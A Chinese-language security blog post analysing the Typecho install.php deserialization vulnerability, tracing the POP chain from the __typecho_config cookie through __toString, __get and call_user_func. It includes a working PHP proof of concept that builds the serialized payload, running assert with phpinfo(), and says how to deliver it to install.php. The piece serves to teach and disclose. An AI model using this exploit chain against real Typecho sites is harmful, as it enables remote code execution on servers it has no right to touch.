---
title: Typecho install.php 反序列化漏洞分析
date: 2017-10-30 14:32:18
tags: [反序列化,漏洞分析,php]
categories: Security
---
<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>

正好在学习php代码审计，简单分析一下前几天的`Typecho install.php`反序列化漏洞

### 漏洞分析
漏洞点出现在`install.php`第229-235行:

![0](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Affah)
这里进行了一个反序列化操作，一般碰到这个都值得注意一下

由于这是初始安装文件，复现时要想流程走到这里就得绕过程序自身的判断，它的判断逻辑如下:

![1](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/fQO9b)

就进行了两个简单的判断，`HTTP_REFERER`是否为空以及是否来源于本站，这是很容易绕过的

往下执行到`unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')))`反序列化操作，如果`Typecho_Cookie::get('__typecho_config')`可控的话就可能导致一个漏洞

跟进`Typecho_Cookie`类的`get()`方法分析一下:

![2](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/HW0eV)

可以看到`$_COOKIE[$key]`的内容都是我们可以控制的，存在风险

继续往下看到
`$db = new Typecho_Db($config['adapter'], $config['prefix']);`这里新建了一个`Typecho_Db`对象，跟进去看一下这个对象的构造方法:

![3](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/yLOrO)

注意这一行`$adapterName = 'Typecho_Db_Adapter_' . $adapterName;`
将`Typecho_Db_Adapter_`属性与字符串进行了拼接，这就涉及到php的一个特性，如果`Typecho_Db_Adapter_`传入的是一个实例化对象，那将自动触发这个对象的`__toString()`方法

我们全局搜索`__toString()`方法，可以在`Feed.php`的第223行找到一个`__toString()`方法:

![4](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/nXTJN)

里面进行了3个`if`判断，注意到第3个`if`中有这样一句(同样在第2个`if`中也存在):

![5](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/11MHn)

访问了`item`元素里的一个属性`screenName`，这就又涉及到php的一个特性，如果我们访问一个对象的私有属性或者不存在的属性到时候，会自动调用这个对象的`__get()`方法，所以我们只要找到一个`__get()`方法并且它的参数可控，那就形成了一条完整的调用链。

全局搜索`__get()`方法，在`Request.php`第269行:

![6](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/zcYKG)

继续跟进`get`，第295行

![7](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/EbE9r)

可以看到自定义的`get()`方法最终返回的是`$this->_applyFilter($value)`，跟进`_applyFilter()`看一下:

![8](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/tztDS)

注意这里调用了`call_user_func()`方法，而且这里的两个参数都是可控的，这就形成了一个任意代码执行的漏洞

反过来回顾一下整个流程，构造`call_user_func()`恶意方法——调用`__get()`方法——调用`__toString()`方法——控制传入的类——反序列化

### PoC
```
<?php
class Typecho_Feed
{
    const ATOM1 = 'ATOM 1.0';
    private $_type;
    private $_items;
	
    public function __construct(){
        $this->_type = $this::ATOM1;
        $this->_items[0] = array(
            'author' => new Typecho_Request(),
        );
    }
}
class Typecho_Request
{
    private $_params = array();
    private $_filter = array();
    public function __construct(){
        $this->_params['screenName'] = 'phpinfo()';
        $this->_filter[0] = 'assert';
    }
}
$exp = array(
    'adapter' => new Typecho_Feed(),
    'prefix' => 'test'
);
echo base64_encode(serialize($exp));
?>
```
构造`__typecho_config`的值等于PoC输出内容，加上`referer`头信息，发送给`http://localhost/install.php?finish=1`
PoC执行流程: base64编码后的序列化内容经过解码后反序列化，传给`Typecho_Db`构造函数，其中`adapter`参数是一个`Typecho_Feed`对象，拼接了字符串会调用`__toString()`方法，控制可控变量进入第2个if分支，执行到`$item['author']->screenName`，当`author`是一个`Typecho_Request`对象且没有`screenName`属性时，会调用`__get()`方法执行`_applyFilter()`，进而执行`call_user_func`，传入`assert(phpinfo());`执行成功

![9](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Ple7u)

最后还有一个`ob_start()`的问题，`install.php`中开启了这个，

> 此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。

所以会触发异常后导致500，同时输出内容会在缓冲区会清除，@[LoRexxar'](https://lorexxar.cn/)给出了两个解决办法

> 1、因为`call_user_func`函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit 跳出，缓冲区中的数据就会被输出出来。
 
> 2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。

总的来看这个漏洞还是比较经典的，涉及到几个特性和两三层的调用链，至于流传的“后门”说法还是持保留态度，我们还是回归到技术交流本身吧~

参考:

[Typecho 前台 getshell 漏洞分析](https://paper.seebug.org/424/)

[POP链和序列化，反序列化操作](http://www.blogsir.com.cn/safe/452.html)

<script>pangu.spacingPage();</script>